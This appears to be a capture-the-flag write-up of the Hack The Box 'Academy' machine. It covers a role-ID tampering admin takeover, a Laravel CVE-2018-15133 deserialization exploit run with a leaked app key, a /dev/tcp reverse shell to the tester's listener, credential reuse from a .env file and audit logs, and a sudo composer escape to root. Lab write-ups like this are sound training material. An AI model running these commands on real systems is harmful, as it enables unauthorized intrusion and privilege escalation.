---
layout: single
title: HTB - Academy
excerpt: HTB - Academy Walkthrough
date: 2022-02-13
classes: wide
header:
  teaser: /assets/images/htb-academy/htb-academy.png
categories:
  - Walkthrough
tags:
  - Laravel
  - CVE-2018-15133
  - adm group
  - aureport
  - composer
---
![](/assets/images/htb-academy/htb-academy.png)


# Nmap

```bash
sudo nmap -sC -sV -p 22,80,33060 -oA scans/tcp-versions.32 10.129.193.73
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-04 23:40 EDT
Stats: 0:02:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 23:44 (0:01:04 remaining)
Nmap scan report for 10.129.193.73
Host is up (0.040s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=8/4%Time=610B5DCE%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.06 seconds
```

# Enumeration

## TCP - 80

A simple `whatweb` shows that it redirects to `academy.htb`

```bash
whatweb http://10.129.193.73
http://10.129.193.73 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.193.73], RedirectLocation[http://academy.htb/]
ERROR Opening: http://academy.htb/ - no address for academy.htb
```

After adding the `academy.htb` to the `/etc/hosts` file, it loads the webpage. 

```bash
whatweb http://academy.htb  
http://academy.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.193.73], Title[Hack The Box Academy]
```

### FFUF

Using `ffuf` showed that `home.php` had a redirect with a large file size. I used `Burp` to intercept and modify the redirect from `302 Found` to `200 Ok`

```bash
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://academy.htb/FUZZ -e .php,.txt,.bak,.old 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://academy.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .bak .old 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

images                  [Status: 301, Size: 311, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 2117, Words: 890, Lines: 77]
login.php               [Status: 200, Size: 2627, Words: 667, Lines: 142]
home.php                [Status: 302, Size: 55034, Words: 4001, Lines: 1050]
register.php            [Status: 200, Size: 3003, Words: 801, Lines: 149]
admin.php               [Status: 200, Size: 2633, Words: 668, Lines: 142]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10]
                        [Status: 200, Size: 2117, Words: 890, Lines: 77]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
```

![/assets/images/htb-academy/Untitled.png](/assets/images/htb-academy/Untitled.png)

I can see that it redirects to a page but nothing works.

![/assets/images/htb-academy/Untitled%201.png](/assets/images/htb-academy/Untitled%201.png)

### Laravel Framework - RCE

I can register a new user and get admin access by intercepting and editing the request.

![/assets/images/htb-academy/Untitled%202.png](/assets/images/htb-academy/Untitled%202.png)

I intercept it in `Burp` to inspect the registration process and changed the `roleid` from 0 to 1

Original Request

![/assets/images/htb-academy/Untitled%203.png](/assets/images/htb-academy/Untitled%203.png)

Edited Request

![/assets/images/htb-academy/Untitled%204.png](/assets/images/htb-academy/Untitled%204.png)

I can login to the `admin.php` page using the registered credentials `dude:Dude123`. On the admin page, there is something interesting `dev-staging-01.academy.htb`

![/assets/images/htb-academy/Untitled%205.png](/assets/images/htb-academy/Untitled%205.png)

I appended the `dev-staging-01.academy.htb` to the `/etc/hosts` file and proceeded to enumerate further.

```bash
10.129.193.73   academy.htb dev-staging-01.academy.htb
```

## dev-staging-01.academy.htb

I found some creds on the landing page which seemed to show some debug information.

![/assets/images/htb-academy/Untitled%206.png](/assets/images/htb-academy/Untitled%206.png)

From the error log, it looks like this is `Laravel Framework` 

![/assets/images/htb-academy/Untitled%207.png](/assets/images/htb-academy/Untitled%207.png)

### Searchsploit

Found an exploit for `CVE-2018-15133` on GitHub: 

[https://github.com/aljavier/exploit_laravel_cve-2018-15133](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

`PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)`

![/assets/images/htb-academy/Untitled%208.png](/assets/images/htb-academy/Untitled%208.png)

A quick check and we have RCE

```bash
python3 pwn_laravel.py "http://dev-staging-01.academy.htb/" "dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=" -c whoami

www-data
```

# Shell

I got a shell using the following payload

```bash
python3 pwn_laravel.py "http://dev-staging-01.academy.htb/" "dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=" -c "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'"
```

```bash
nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.129.193.73] 56782
bash: cannot set terminal process group (1117): Inappropriate ioctl for device
bash: no job control in this shell
www-data@academy:/var/www/html/htb-academy-dev-01/public$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@academy:/var/www/html/htb-academy-dev-01/public$
```

# PrivEsc

Checking users on the system 

```bash
grep -v 'nologin\|false' /etc/passwd

root:x:0:0:root:/root:/bin/bash
egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
21y4d:x:1003:1003::/home/21y4d:/bin/sh
ch4p:x:1004:1004::/home/ch4p:/bin/sh
g0blin:x:1005:1005::/home/g0blin:/bin/sh
```

Enumerating the `/var/www/html/academy`  directory, I found some creds

```bash
Reading /var/www/html/academy/.env                                                                                                                                                
APP_NAME=Laravel                                                                                                                                                                  
APP_ENV=local                                                                                                                                                                     
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=                                                                                                                       
APP_DEBUG=false                                                                                                                                                                   
APP_URL=http://localhost                                                                                                                                                          
                                                                                                                                                                                  
LOG_CHANNEL=stack                                                                                                                                                                 
                                                                                                                                                                                  
DB_CONNECTION=mysql                                                                                                                                                               
DB_HOST=127.0.0.1                                                                                                                                                                 
DB_PORT=3306                                                                                                                                                                      
DB_DATABASE=academy                                                                                                                                                               
DB_USERNAME=dev                                                                                                                                                                   
DB_PASSWORD=mySup3rP4s5w0rd!!
```

I can  `su - cry0l1t3` using the password I found on the `.env` file

```bash
www-data@academy:/dev/shm$ su - cry0l1t3
Password: 
$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
$ ls -la
total 32
drwxr-xr-x 4 cry0l1t3 cry0l1t3 4096 Aug 12  2020 .
drwxr-xr-x 8 root     root     4096 Aug 10  2020 ..
lrwxrwxrwx 1 root     root        9 Aug 10  2020 .bash_history -> /dev/null
-rw-r--r-- 1 cry0l1t3 cry0l1t3  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 cry0l1t3 cry0l1t3 3771 Feb 25  2020 .bashrc
drwx------ 2 cry0l1t3 cry0l1t3 4096 Aug 12  2020 .cache
drwxrwxr-x 3 cry0l1t3 cry0l1t3 4096 Aug 12  2020 .local
-rw-r--r-- 1 cry0l1t3 cry0l1t3  807 Feb 25  2020 .profile
-r--r----- 1 cry0l1t3 cry0l1t3   33 Aug  5 03:33 user.txt
$ /bin/bash
```

# User Flag

```bash
cry0l1t3@academy:~$ cat user.txt 
1f5e1758a042c2c1d59baa257e0dbcf5
```

The user `cry0l1t3` is a member of the `adm` group. This means, that we can read logs

```bash
cry0l1t3@academy:~$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

I went through `auth.log, syslog, kern.log` but didn't find much. However I noticed there audit logs under `/var/log/audit/`

```bash
cry0l1t3@academy:/var/log/audit$ pwd
/var/log/audit
cry0l1t3@academy:/var/log/audit$ ls -la
total 25164
drwxr-x---  2 root adm       4096 Nov  9  2020 .
drwxrwxr-x 12 root syslog    4096 Aug  5 03:33 ..
-rw-r-----  1 root adm     562585 Aug  5 19:09 audit.log
-r--r-----  1 root adm    8388813 Nov  9  2020 audit.log.1
-r--r-----  1 root adm    8388720 Sep  4  2020 audit.log.2
-r--r-----  1 root adm    8388617 Aug 23  2020 audit.log.3
cry0l1t3@academy:/var/log/audit$
```

Using `aureport --tty` I can see what looks like credentials of the user `mrb3n`

![/assets/images/htb-academy/Untitled%209.png](/assets/images/htb-academy/Untitled%209.png)

I can ssh to the box using `mrb3n:mrb3n_Ac@d3my!`  and executing `sudo -l` shows that I can execute `composer` 

```bash
Last login: Tue Feb  9 14:20:36 2021
$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
$
```

## GTFObins

According to gtfobins [https://gtfobins.github.io/gtfobins/composer/](https://gtfobins.github.io/gtfobins/composer/) 

```bash
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

```bash
$ TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x$ $ 
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
academy.txt  root.txt  snap
# cat root.txt
cbf6e9b3d38ba1f729756044f057b2f3
#
```

# Root Flag

```bash
# cat root.txt
cbf6e9b3d38ba1f729756044f057b2f3
```
